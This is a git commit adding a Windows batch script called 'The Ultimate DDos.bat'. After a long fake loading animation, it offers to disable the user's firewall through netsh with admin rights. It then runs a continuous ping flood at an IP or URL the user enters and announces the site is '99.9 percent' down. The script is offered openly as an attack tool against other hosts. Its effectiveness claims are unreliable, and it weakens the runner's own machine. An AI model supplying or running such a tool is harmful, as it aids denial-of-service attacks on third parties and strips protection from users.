d873326567fc6fa4a1d0488650f1725358a5d677
ticcersofficial <59410756+ticcersofficial@users.noreply.github.com>
2022-02-05 13:54:03 +0100

    Add files via upload

---
+++ The Ultimate DDos.bat
@@ -0,0 +1,319 @@
+@echo off
+color 0a
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading...        Please Wait
+echo ---------------------------------------
+echo                                 =   0 ]
+echo ---------------------------------------
+ping localhost -n 2 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading.          Please Wait
+echo ---------------------------------------
+echo []                              =   5 ]
+echo ---------------------------------------
+ping localhost -n 3 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading..         Please Wait
+echo ---------------------------------------
+echo [][]                            =  15 ]
+echo ---------------------------------------
+ping localhost -n 2 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading...        Please Wait
+echo ---------------------------------------
+echo [][][]                          =  23 ]
+echo ---------------------------------------
+ping localhost -n 3 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading.          Please Wait
+echo ---------------------------------------
+echo [][][][]                        =  30 ]
+echo ---------------------------------------
+ping localhost -n 4 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading..         Please Wait
+echo ---------------------------------------
+echo [][][][][]                      =  38 ]
+echo ---------------------------------------
+ping localhost -n 2 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading...        Please Wait
+echo ---------------------------------------
+echo [][][][][]                      =  42 ]
+echo ---------------------------------------
+ping localhost -n 3 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading.          Please Wait
+echo ---------------------------------------
+echo [][][][][][]                    =  45 ]
+echo ---------------------------------------
+ping localhost -n 1 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading..         Please Wait
+echo ---------------------------------------
+echo [][][][][][][]                  =  48 ]
+echo ---------------------------------------
+ping localhost -n 3 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading...        Please Wait
+echo ---------------------------------------
+echo [][][][][][][][]                =  50 ]
+echo ---------------------------------------
+ping localhost -n 3 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading.           Please Wait
+echo ---------------------------------------
+echo [][][][][][][][][]              =  56 ]
+echo ---------------------------------------
+ping localhost -n 2 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading..         Please Wait
+echo ---------------------------------------
+echo [][][][][][][][][][]            =  63 ]
+echo ---------------------------------------
+ping localhost -n 2 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading...        Please Wait
+echo ---------------------------------------
+echo [][][][][][][][][][][]          =  69 ]
+echo ---------------------------------------
+ping localhost -n 3 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading.          Please Wait
+echo ---------------------------------------
+echo [][][][][][][][][][][][]        =  75 ]
+echo ---------------------------------------
+ping localhost -n 2 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading..         Please Wait
+echo ---------------------------------------
+echo [][][][][][][][][][][][][]      =  79 ]
+echo ---------------------------------------
+ping localhost -n 3 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading...        Please Wait
+echo ---------------------------------------
+echo [][][][][][][][][][][][][][]    =  86 ]
+echo ---------------------------------------
+ping localhost -n 2 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading.          Please Wait
+echo ---------------------------------------
+echo [][][][][][][][][][][][][][][]  =  90 ]
+echo ---------------------------------------
+ping localhost -n 3 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading..         Please Wait
+echo ---------------------------------------
+echo [][][][][][][][][][][][][][][]  =  96 ]
+echo ---------------------------------------
+ping localhost -n 3 >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo    Loading...        .Complete.
+echo ---------------------------------------
+echo [][][][][][][][][][][][][][][][]= 100 ]
+echo ---------------------------------------
+cls
+color 72
+echo THE ULTIMATE DDOS'er made by: ts._.taha
+echo.
+echo You can stop at anytime by clicking CTRL+C
+echo.
+echo And yeah use this at your own risk o.o
+echo.
+echo Enjoy........!
+@pause
+cls
+:choice
+set /P c=Disable Firewall?(Better chances for a perfect attack)[Y/N]?
+cls
+if /I "%c%" EQU "Y" goto :No-Firewall
+if /I "%c%" EQU "N" goto :Firewall
+goto :choice
+:No-Firewall
+echo Note : WE WILL ACTIVATE FIREWALLS BACK WHEN YOU FINISH!
+echo And yeah you need to run this .bat file as an admin too
+echo If you havent done it , exit and then Right click the file....
+echo ....Run as an adminstrator and voila!
+@pause
+cls
+netsh advfirewall set allprofiles state off
+echo OK = firewall is off.
+echo anything else = FIREWALL STILL ON ! (Read the steps back)
+echo.
+echo.
+set /p ip="Type the IP or the URL you want to ddos: "
+cls
+set /p np="Select the number of packets to send: "
+cls
+echo NEVER EXIT THIS PAGE! 
+echo IF THE [Y/N] choice is prompted always choose "n"
+echo SO THAT WE CAN RE-ACTIVATE YOUR FIREWALL!
+start /wait ping %ip% -t -l %np%
+cls
+color 0a
+echo GO CHECK THAT WEBSITE NOW! 99.9 percent its down!
+netsh advfirewall set allprofiles state on
+exit
+:Firewall
+set /p ip="Type the IP or the URL you want to ddos: "
+cls
+set /p np="Select the number of packets to send: "
+cls
+@pause
+ping %ip% -t -l %np%
+cls
+color 0a
+echo GO CHECK THAT WEBSITE NOW! 99.9 percent its down!
+@pause
